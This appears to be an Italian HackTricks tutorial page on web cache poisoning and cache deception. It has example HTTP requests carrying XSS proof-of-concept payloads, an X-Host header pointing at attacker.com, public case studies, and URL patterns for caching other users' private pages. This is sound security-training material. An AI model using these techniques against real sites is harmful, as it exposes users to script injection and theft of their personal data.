# Cache Poisoning e Cache Deception

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare flussi di lavoro** con gli strumenti comunitari pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## La differenza

> **Qual √® la differenza tra cache poisoning e cache deception?**
>
> * Nel **cache poisoning**, l'attaccante fa s√¨ che l'applicazione memorizzi alcuni contenuti dannosi nella cache e questi contenuti vengono serviti dalla cache ad altri utenti dell'applicazione.
> * Nella **cache deception**, l'attaccante fa s√¨ che l'applicazione memorizzi alcuni contenuti sensibili appartenenti a un altro utente nella cache e l'attaccante recupera poi questi contenuti dalla cache.

## Cache Poisoning

Il cache poisoning mira a manipolare la cache lato client per costringere i client a caricare risorse inaspettate, parziali o sotto il controllo di un attaccante. L'entit√† dell'impatto dipende dalla popolarit√† della pagina interessata, poich√© la risposta contaminata viene servita esclusivamente agli utenti che visitano la pagina durante il periodo di contaminazione della cache.

L'esecuzione di un attacco di cache poisoning comporta diversi passaggi:

1. **Identificazione degli input non chiave**: Si tratta di parametri che, sebbene non siano necessari per memorizzare una richiesta nella cache, possono modificare la risposta restituita dal server. L'identificazione di questi input √® fondamentale poich√© possono essere sfruttati per manipolare la cache.

2. **Sfruttamento degli input non chiave**: Dopo aver identificato gli input non chiave, il passo successivo consiste nel capire come sfruttare questi parametri per modificare la risposta del server in modo vantaggioso per l'attaccante.

3. **Garantire che la risposta manipolata sia memorizzata nella cache**: L'ultimo passaggio consiste nel garantire che la risposta manipolata sia memorizzata nella cache. In questo modo, ogni utente che accede alla pagina interessata mentre la cache √® contaminata ricever√† la risposta alterata.

### Scoperta: Verifica degli header HTTP

Di solito, quando una risposta viene **memorizzata nella cache**, ci sar√† un **header che lo indica**, puoi verificare a quali header dovresti prestare attenzione in questo post: [**Header di cache HTTP**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Scoperta: Memorizzazione del codice 400 nella cache

Se pensi che la risposta venga memorizzata nella cache, puoi provare a **inviare richieste con un header errato**, che dovrebbe ottenere una **risposta con codice di stato 400**. Quindi prova ad accedere normalmente alla richiesta e se la **risposta √® un codice di stato 400**, sai che √® vulnerabile (e potresti persino eseguire un DoS).\
Un header configurato in modo errato potrebbe essere semplicemente `\:` come header.\
Nota che a volte questi tipi di codici di stato non vengono memorizzati nella cache, quindi questo test sar√† inutile.

### Scoperta: Identificazione e valutazione degli input non chiave

Puoi utilizzare [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) per **forzare i parametri e gli header** che potrebbero **modificare la risposta della pagina**. Ad esempio, una pagina potrebbe utilizzare l'header `X-Forwarded-For` per indicare al client di caricare lo script da l√¨:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Elicitare una risposta dannosa dal server di back-end

Con il parametro/header identificato, controlla come viene **sanificato** e **dove** viene **riflesso** o influisce sulla risposta dall'header. Puoi sfruttarlo in qualche modo (eseguire un XSS o caricare un codice JS controllato da te? Eseguire un DoS?...)

### Ottenere la risposta memorizzata nella cache

Una volta **identificata** la **pagina** che pu√≤ essere sfruttata, quale **parametro**/**header** utilizzare e **come** sfruttarlo, devi ottenere la pagina memorizzata nella cache. A seconda della risorsa che stai cercando di ottenere nella cache, potrebbe richiedere del tempo, potresti dover provare per diversi secondi.\
L'header **`X-Cache`** nella risposta pu√≤ essere molto utile in quanto potrebbe avere il valore **`miss`** quando la richiesta non √® stata memorizzata nella cache e il valore **`hit`** quando √® memorizzata nella cache.\
L'header **`Cache-Control`** √® interessante anche per sapere se una risorsa viene memorizzata nella cache e quando verr√† memorizzata nuovamente: `Cache-Control: public, max-age=1800`\
Un altro header interessante √® **`Vary`**. Questo header viene spesso utilizzato per **indicare ulteriori header** che vengono considerati **parte della chiave di cache** anche se di solito non sono chiave. Pertanto, se l'utente conosce l'`User-Agent` della vittima che sta mirando, pu√≤ corrompere la cache per gli utenti che utilizzano quel determinato `User-Agent`.\
Un altro header correlato alla cache √® **`Age`**. Definisce il tempo in secondi in cui l'oggetto √® stato nella cache del proxy.

Quando si memorizza una richiesta nella cache, **fai attenzione agli header che utilizzi** perch√© alcuni di essi potrebbero essere utilizzati in modo **inaspettato** come **chiave** e la **vittima dovr√† utilizzare lo stesso header**. Testa sempre un Cache Poisoning con **browser diversi** per verificare se funziona.

## Esempi di sfruttamento

### Esempio pi√π semplice

Un header come `X-Forwarded-For` viene riflesso nella risposta non sanificata.\
Puoi inviare un payload XSS di base e corrompere la cache in modo che tutti coloro che accedono alla pagina saranno vittime di XSS:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nota che questo avvelener√† una richiesta a `/en?region=uk` e non a `/en`_

### Utilizzare l'avvelenamento della cache web per sfruttare le vulnerabilit√† di gestione dei cookie

I cookie potrebbero anche essere riflessi nella risposta di una pagina. Se puoi abusarne per causare ad esempio un XSS, potresti essere in grado di sfruttare l'XSS su diversi client che caricano la risposta della cache malevola.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Nota che se il cookie vulnerabile √® molto utilizzato dagli utenti, le richieste regolari puliranno la cache.

### Utilizzo di pi√π intestazioni per sfruttare le vulnerabilit√† di avvelenamento della cache web <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

A volte sar√† necessario **sfruttare diversi input non chiave** per poter abusare della cache. Ad esempio, potresti trovare un **reindirizzamento aperto** se imposti `X-Forwarded-Host` su un dominio controllato da te e `X-Forwarded-Scheme` su `http`. **Se** il **server** sta **inoltrando** tutte le richieste **HTTP** a **HTTPS** e utilizza l'intestazione `X-Forwarded-Scheme` come nome di dominio per il reindirizzamento. Puoi controllare dove la pagina viene puntata dal reindirizzamento.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Sfruttare con l'header `Vary` limitato

Se hai scoperto che l'header **`X-Host`** viene utilizzato come **nome di dominio per caricare una risorsa JS**, ma l'header **`Vary`** nella risposta indica **`User-Agent`**, allora devi trovare un modo per esfiltrare l'User-Agent della vittima e avvelenare la cache utilizzando quel user agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Sfruttare l'Avvelenamento della Cache HTTP sfruttando l'HTTP Request Smuggling

Scopri qui come eseguire [attacchi di Avvelenamento della Cache sfruttando l'HTTP Request Smuggling](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Test automatico per l'Avvelenamento della Cache Web

Lo [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) pu√≤ essere utilizzato per testare automaticamente l'avvelenamento della cache web. Supporta molte tecniche diverse ed √® altamente personalizzabile.

Esempio di utilizzo: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro supportati dagli strumenti comunitari pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Esempi Vulnerabili

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS inoltrava il frammento all'interno dell'URL senza rimuoverlo e generava la chiave della cache utilizzando solo l'host, il percorso e la query (ignorando il frammento). Quindi la richiesta `/#/../?r=javascript:alert(1)` veniva inviata al backend come `/#/../?r=javascript:alert(1)` e la chiave della cache non conteneva il payload al suo interno, solo l'host, il percorso e la query.

### GitHub CP-DoS

L'invio di un valore errato nell'intestazione content-type provocava una risposta in cache 405. La chiave della cache conteneva il cookie, quindi era possibile attaccare solo gli utenti non autenticati.

### GitLab + GCP CP-DoS

GitLab utilizza i bucket GCP per archiviare contenuti statici. I **bucket GCP** supportano l'**intestazione `x-http-method-override`**. Quindi era possibile inviare l'intestazione `x-http-method-override: HEAD` e avvelenare la cache restituendo un corpo di risposta vuoto. Poteva anche supportare il metodo `PURGE`.

### Rack Middleware (Ruby on Rails)

Nelle applicazioni Ruby on Rails, spesso viene utilizzato il middleware Rack. Lo scopo del codice Rack √® quello di prendere il valore dell'intestazione **`x-forwarded-scheme`** e impostarlo come schema della richiesta. Quando viene inviata l'intestazione `x-forwarded-scheme: http`, si verifica un reindirizzamento 301 alla stessa posizione, causando potenzialmente un Denial of Service (DoS) a quella risorsa. Inoltre, l'applicazione potrebbe riconoscere l'intestazione `X-forwarded-host` e reindirizzare gli utenti all'host specificato. Questo comportamento pu√≤ portare al caricamento di file JavaScript dal server di un attaccante, creando un rischio per la sicurezza.

### 403 e Storage Buckets

In passato, Cloudflare memorizzava in cache le risposte 403. Tentare di accedere a S3 o Azure Storage Blobs con intestazioni di autorizzazione errate avrebbe comportato una risposta 403 che veniva memorizzata nella cache. Anche se Cloudflare ha smesso di memorizzare nella cache le risposte 403, questo comportamento potrebbe essere ancora presente in altri servizi proxy.

### Iniezione di Parametri Chiave

Le cache spesso includono specifici parametri GET nella chiave della cache. Ad esempio, Varnish di Fastly memorizzava il parametro `size` nelle richieste. Tuttavia, se veniva inviata anche una versione URL-encoded del parametro (ad esempio, `siz%65`) con un valore errato, la chiave della cache veniva costruita utilizzando il parametro `size` corretto. Tuttavia, il backend avrebbe elaborato il valore nel parametro URL-encoded. L'URL-encoding del secondo parametro `size` portava alla sua esclusione dalla cache ma alla sua utilizzazione da parte del backend. Assegnare un valore di 0 a questo parametro risultava in un errore 400 Bad Request memorizzabile nella cache.

### Regole dell'User Agent

Alcuni sviluppatori bloccano le richieste con user-agent corrispondenti a strumenti ad alto traffico come FFUF o Nuclei per gestire il carico del server. Ironia della sorte, questo approccio pu√≤ introdurre vulnerabilit√† come l'avvelenamento della cache e il DoS.

### Campi Intestazione Illegali

L'[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specifica i caratteri accettabili nei nomi delle intestazioni. Le intestazioni che contengono caratteri al di fuori dell'intervallo specificato **tchar** dovrebbero idealmente generare una risposta 400 Bad Request. Nella pratica, i server non sempre si attengono a questo standard. Un esempio notevole √® Akamai, che inoltra intestazioni con caratteri non validi e memorizza qualsiasi errore 400, purch√© l'intestazione `cache-control` non sia presente. √à stato identificato un pattern sfruttabile in cui l'invio di un'intestazione con un carattere non valido, come `\`, avrebbe comportato un errore 400 Bad Request memorizzabile nella cache.

### Trovare nuove intestazioni

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Inganno della Cache

L'obiettivo dell'Inganno della Cache √® far s√¨ che i client **carichino risorse che verranno salvate nella cache con le loro informazioni sensibili**.

Prima di tutto, nota che le **estensioni** come `.css`, `.js`, `.png`, ecc. sono di solito **configurate** per essere **salvate** nella **cache**. Pertanto, se accedi a `www.example.com/profile.php/nonexistent.js`, la cache probabilmente memorizzer√† la risposta perch√© vede l'estensione `.js`. Ma se l'applicazione sta riproducendo i contenuti sensibili dell'utente memorizzati in _www.example.com/profile.php_, puoi **rubare** quei contenuti da altri utenti.

Altre cose da testare:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Utilizza estensioni meno conosciute come_ `.avif`

Un altro esempio molto chiaro pu√≤ essere trovato in questo articolo: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Nell'esempio, viene spiegato che se carichi una pagina inesistente come _http://www.example.com/home.php/non-existent.css_, verr√† restituito il contenuto di _http://www.example.com/home.php_ (**con le informazioni sensibili dell'utente**) e il server della cache salver√† il risultato.\
Quindi, l'**attaccante** pu√≤ accedere a _http://www.example.com/home.php/non-existent.css_ nel proprio browser e osservare le **informazioni confidenziali** degli utenti che hanno accesso in precedenza.

Nota che il **proxy della cache** dovrebbe essere **configurato** per **memorizzare** i file **in base all'estensione** del file (_.css_) e non in base al tipo di contenuto. Nell'esempio _http://www.example.com/home.php/non-existent.css_ avr√† un content-type `text/html` invece di un tipo mime `text/css` (che √® quello previsto per un file _.css_).

Scopri qui come eseguire [attacchi di Inganno della
<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
